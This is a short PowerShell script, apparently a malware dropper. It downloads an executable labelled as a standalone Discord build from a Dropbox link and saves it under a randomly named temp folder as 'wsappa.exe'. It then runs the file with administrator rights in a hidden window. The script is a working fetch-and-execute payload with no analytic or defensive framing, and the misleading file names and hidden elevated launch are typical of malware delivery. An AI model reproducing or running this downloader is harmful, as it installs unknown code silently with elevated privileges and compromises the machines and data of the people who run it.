$fileUrl = "dl.dropboxusercontent.com/s/tkwdo87ytt85ke47bu19z/StandAlone-Discord.exe?rlkey=9z7xwpnxxf26wishtfos6k6wc&dl=0"
$savePath = "$env:temp\sVBXKuz\wsappa.exe"

if (!(Test-Path -Path $savePath)) {
    try {
        Invoke-WebRequest -Uri "dl.dropboxusercontent.com/s/tkwdo87ytt85ke47bu19z/StandAlone-Discord.exe?rlkey=9z7xwpnxxf26wishtfos6k6wc&dl=0" -OutFile $env:temp\sVBXKuz\wsappa.exe
        Start-Process $env:temp\sVBXKuz\wsappa.exe -Verb RunAs -WindowStyle Hidden  
    } catch {
        Write-Host "Failed to download the file: $_"
    }
} else {
    Write-Host "File already exists."
}


exit

